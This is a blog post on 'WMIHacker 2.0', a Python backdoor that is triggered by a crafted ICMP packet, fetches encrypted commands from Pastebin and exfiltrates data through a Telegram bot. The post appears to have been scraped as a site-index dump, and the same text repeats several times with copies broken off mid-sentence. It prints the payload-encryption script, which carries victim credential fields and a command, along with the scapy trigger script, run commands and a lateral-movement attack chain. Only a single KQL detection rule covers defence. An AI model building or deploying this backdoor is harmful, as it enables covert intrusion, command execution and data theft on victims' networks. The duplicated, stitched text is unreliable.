bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed in\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and m\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented 